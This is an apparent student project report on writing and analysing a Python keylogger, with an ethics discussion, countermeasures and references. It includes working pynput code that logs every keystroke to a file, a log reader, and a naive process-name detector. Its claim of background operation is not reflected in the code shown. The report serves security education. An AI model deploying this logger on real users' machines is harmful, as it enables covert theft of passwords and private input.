# Development and Analysis of a Keylogger using Python

![NIELIT Logo](assets/NIELIT_logo.jpg)

## Executive Summary
A Python-based keylogger was developed and analyzed to understand its functionality, potential misuse, and defense strategies in cybersecurity. 
The project highlights both the technical aspects of creating such tools and the ethical implications of their usage. 
By studying keylogger behavior, the project emphasizes the importance of awareness, detection, and mitigation strategies to strengthen system security.

## Abstract
This project focuses on the development and analysis of a simple keylogger application using Python for educational and research purposes in cybersecurity. 
The implementation begins with utilizing Python libraries such as `pynput` to capture keyboard events in real time. 
The captured keystrokes are stored in a log file, allowing the monitoring of user input for analysis.

The project explores techniques for running the keylogger in the background, ensuring it operates unobtrusively without interrupting normal system usage. 
Additional functionality, such as time-stamping keystrokes and custom log file storage paths, is also implemented to enhance usability.

On the analytical side, the project examines the potential security implications of keyloggers, including their use in both ethical research and malicious attacks. 
It highlights countermeasures such as antivirus detection, system monitoring tools, and user awareness programs to mitigate risks.

Overall, this project serves as a practical demonstration of how keyloggers function while also emphasizing ethical considerations, 
defensive strategies, and the importance of understanding such tools in the field of cybersecurity.

---

## Introduction
The rise of cyber threats has made cybersecurity an essential discipline in the digital age. 
Among the numerous tools used by attackers, keyloggers remain one of the most effective means of compromising sensitive information. 
A keylogger records keystrokes typed on a keyboard and may be used for malicious purposes such as stealing credentials, financial information, or confidential data. 

However, studying keyloggers is equally important in ethical hacking and cybersecurity education to understand how attackers operate and how to defend against such threats. 
This project introduces the design and implementation of a simple keylogger using Python, providing insights into its development, operation, and associated risks.

---

## Methodology
The methodology for this project involved the following steps:

1. **Environment Setup**: Python environment was prepared with required libraries such as `pynput`.
2. **Implementation of Keylogger**: A script was developed to capture keystrokes in real time and store them in a log file.
3. **Enhancements**: Features such as time-stamping and background execution were added.
4. **Testing**: The script was tested on a controlled environment to validate its accuracy and efficiency.
5. **Analysis**: The behavior of the keylogger was studied to identify potential risks and countermeasures.

This approach ensured that the project remained within ethical and educational boundaries, avoiding misuse while demonstrating practical functionality.

---

## Code Implementation

### 🔹 `demo_keylogger.py`
```python
from pynput import keyboard
import logging
from datetime import datetime

# Log file configuration
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

### 🔹 `log_analyzer.py`
```python
# Reads log file and prints analysis
def analyze_logs(log_file="key_log.txt"):
    try:
        with open(log_file, "r") as f:
            lines = f.readlines()
            print(f"Total keystrokes recorded: {len(lines)}")
            print("Sample log entries:")
            print("".join(lines[:10]))
    except FileNotFoundError:
        print("Log file not found.")

if __name__ == "__main__":
    analyze_logs()
```

### 🔹 `detector.py`
```python
import psutil

# Detect if 'python' process is running keylogger
def detect_keylogger():
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if "python" in proc.info['name'].lower() and "keylogger" in " ".join(proc.info['cmdline']).lower():
                suspicious.append(proc.info)
        except Exception:
            pass
    if suspicious:
        print("⚠️ Potential Keylogger Detected:", suspicious)
    else:
        print("✅ No keylogger detected.")

if __name__ == "__main__":
    detect_keylogger()
```

---

## Results and Analysis
The developed Python keylogger successfully captured keystrokes and stored them in a designated log file. 
The tool was able to operate in the background without disrupting normal system operations.

Key Observations:
- The keylogger reliably recorded user inputs including letters, numbers, and special characters.
- Time-stamping provided contextual information useful for forensic analysis.
- Running in the background made it unobtrusive and difficult to detect for an untrained user.

The project confirmed the potential dangers of keyloggers when misused, including identity theft, data breaches, and unauthorized surveillance. 
It emphasized the importance of employing defensive measures such as updated antivirus software, intrusion detection systems, and strong user awareness programs.

---

## Conclusion
This project successfully demonstrated the development and operation of a keylogger using Python. 
It provided insights into how such tools function, their potential malicious use, and the ethical importance of studying them in the context of cybersecurity. 

Future work could involve extending the project to analyze detection techniques using machine learning and exploring more advanced countermeasures. 
Ultimately, this project underscores the balance between offensive cybersecurity research and defensive application in real-world scenarios.

---

## References
1. Alazab, M. (2015). Malware detection and mitigation in computer networks: Keyloggers and spyware. IEEE Communications Surveys & Tutorials.
2. Python Software Foundation. (2023). Python Documentation. Available at: https://docs.python.org
3. Pynput Library Documentation. (2023). Available at: https://pynput.readthedocs.io/
4. Stallings, W. (2018). Computer Security: Principles and Practice. Pearson.
5. SANS Institute. (2022). Keylogger Threats and Defensive Strategies. Available at: https://www.sans.org/
